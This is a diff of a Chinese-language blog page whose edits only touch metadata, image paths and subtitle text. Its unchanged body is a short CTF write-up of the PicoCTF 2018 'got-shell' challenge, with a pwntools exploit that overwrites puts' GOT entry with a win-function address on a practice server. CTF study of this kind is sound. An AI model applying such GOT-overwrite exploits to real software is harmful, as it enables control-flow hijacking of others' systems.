@@ -29,13 +29,13 @@
 <meta property="og:site_name" content="网络幻影">
 <meta property="og:description" content="pwn的题一般是栈溢出，格式化漏洞，堆利用，逻辑漏洞 其中据我了解堆利用比栈的难度高很多，逻辑漏洞更是灵活。 这次恰好碰到一个逻辑漏洞记录一下。  所以可以直接写exp了 12345678910111213from pwn import *r&#x3D;remote(&#x27;node5.buuoj.cn&#x27;,25642)elf&#x3D;ELF(&#x27;.&#x2F;PicoCTF_2018_got-shell">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://linkpwn.github.io/2025/03/20/picoctf-2018-got-shell-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/1.png">
+<meta property="og:image" content="http://linkpwn.github.io/picoctf-2018-got-shell-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/1.png">
 <meta property="article:published_time" content="2025-03-20T07:49:42.000Z">
-<meta property="article:modified_time" content="2025-09-23T12:45:46.312Z">
+<meta property="article:modified_time" content="2025-09-23T12:45:46.000Z">
 <meta property="article:author" content="linkpwn">
-<meta property="article:tag" content="ctf学习，编程学习，游戏，日常">
+<meta property="article:tag" content="ctf学习, 编程学习, 游戏, 日常">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://linkpwn.github.io/2025/03/20/picoctf-2018-got-shell-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/1.png">
+<meta name="twitter:image" content="http://linkpwn.github.io/picoctf-2018-got-shell-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/1.png">
 
 <link rel="canonical" href="http://linkpwn.github.io/2025/03/20/picoctf-2018-got-shell-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">
 
@@ -104,7 +104,7 @@
       <h1 class="site-title">网络幻影</h1>
       <span class="logo-line-after"><i></i></span>
     </a>
-      <p class="site-subtitle" itemprop="description">linkpwn太卷了?</p>
+      <p class="site-subtitle" itemprop="description">linkpwn</p>
       <a>
         <img class="custom-logo-image" src="/uploads/custom-logo.jpg" alt="网络幻影">
       </a>
@@ -198,7 +198,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
       <meta itemprop="name" content="linkpwn">
-      <meta itemprop="description" content="linkpwn的学习经历">
+      <meta itemprop="description" content="linkpwn的学习记录">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -264,7 +264,7 @@
         <p>pwn的题一般是栈溢出，格式化漏洞，堆利用，逻辑漏洞</p>
 <p>其中据我了解堆利用比栈的难度高很多，逻辑漏洞更是灵活。</p>
 <p>这次恰好碰到一个逻辑漏洞记录一下。</p>
-<p><img src="/2025/03/20/picoctf-2018-got-shell-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/1.png" alt="1"></p>
+<p><img src="/./picoctf-2018-got-shell-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/1.png" alt="1"></p>
 <p>所以可以直接写exp了</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r=remote(&#x27;node5.buuoj.cn&#x27;,25642)</span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;./PicoCTF_2018_got-shell&#x27;)</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">win_addr=0x0804854B</span><br><span class="line"></span><br><span class="line">r.sendlineafter(b&quot;I&#x27;ll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?&quot;, hex(puts_got))</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(hex(win_addr))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
@@ -373,7 +373,7 @@
     <img class="site-author-image" itemprop="image" alt="linkpwn"
       src="/images/avatar.jpg">
   <p class="site-author-name" itemprop="name">linkpwn</p>
-  <div class="site-description" itemprop="description">linkpwn的学习经历</div>
+  <div class="site-description" itemprop="description">linkpwn的学习记录</div>
 </div>
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
